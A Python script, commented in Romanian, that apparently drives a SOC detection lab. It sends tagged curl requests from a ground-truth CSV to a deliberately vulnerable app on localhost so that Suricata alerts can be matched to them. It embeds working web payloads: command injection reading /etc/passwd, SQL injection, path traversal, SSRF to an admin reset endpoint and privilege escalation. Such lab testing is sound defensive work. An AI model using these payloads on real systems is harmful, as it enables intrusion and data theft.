#!/usr/bin/env python3
"""
Trimite cererile din web_runs.csv catre aplicatie, cu payload-uri reale.

Payload-urile concrete stau aici, in cod, versionate -- CSV-ul ramane despre
CE masori, nu despre CUM ataci. Sunt extrase din testele DVRA
(app/tests/vulns/level_*.py).

request_id merge in User-Agent ca soc-lab/w-001, ca alerta Suricata sa se lege
determinist de randul de ground truth.

    python3 attack_runner.py                       # catre localhost:8091
    python3 attack_runner.py --host 192.168.56.10  # din alta sursa
    python3 attack_runner.py --list                # doar arata ce ar trimite
"""

from __future__ import annotations

import argparse
import csv
import subprocess
import time
from pathlib import Path

PAYLOADS: dict[str, dict[str, str]] = {
    "command_injection_parameters": {
        "query": "parameters=%26%26echo%20vulnerable%21",
    },
    "command_injection_parameters_urlencoded": {
        "query": "parameters=%26%26echo%20vulnerable%21",
    },
    "privilege_escalation_role_grant": {
        "body": '{"username":"customer","role":"Employee"}',
    },
    "ssrf_image_url": {
        "body": '{"name":"x","price":1,"category":"MAIN",'
                '"image_url":"http://localhost:8091/admin/reset-chef-password"}',
    },
    "missing_authorization": {},
    "idor_other_user": {
        "body": '{"first_name":"smile","last_name":"x","phone_number":"123"}',
    },
    "info_disclosure_response_header": {},
    "sql_injection_tautology": {"query": "id=1%27%20OR%20%271%27%3D%271"},
    "path_traversal": {"query": "file=..%2f..%2f..%2fetc%2fpasswd"},
    "command_injection_semicolon": {"query": "x=%3Bcat%20%2fetc%2fpasswd"},
    "scanner_probe": {},
    "secrets_probe": {},
    "none": {},
}


def build_curl(base: str, row: dict) -> list[str]:
    rid = row["request_id"]
    method = row["method"]
    route = row["route"]
    spec = PAYLOADS.get(row["payload_kind"], {})

    url = f"{base}{route}"
    query = spec.get("query", "")
    if query:
        url += ("&" if "?" in url else "?") + query

    cmd = ["curl", "-4", "-s", "-o", "/dev/null",
           "-A", f"soc-lab/{rid}", "-X", method, url]
    if "body" in spec:
        cmd += ["-H", "Content-Type: application/json", "-d", spec["body"]]
    return cmd


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="localhost")
    parser.add_argument("--port", type=int, default=8091)
    parser.add_argument("--csv", type=Path,
                        default=Path("../groundtruth/web_runs.csv"))
    parser.add_argument("--delay", type=float, default=0.4)
    parser.add_argument("--list", action="store_true")
    args = parser.parse_args()

    base = f"http://{args.host}:{args.port}"
    rows = list(csv.DictReader(args.csv.open()))

    missing = {r["payload_kind"] for r in rows
               if r["payload_kind"] not in PAYLOADS}
    if missing:
        print(f"ATENTIE: payload_kind fara payload: {missing}")
        print("Cererile astea pleaca fara payload.\n")

    for row in rows:
        cmd = build_curl(base, row)
        print(f"{row['request_id']:6} {row['method']:6} {cmd[-1]}")
        if not args.list:
            subprocess.run(cmd)
            time.sleep(args.delay)

    if not args.list:
        print(f"\n{len(rows)} cereri trimise catre {base}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
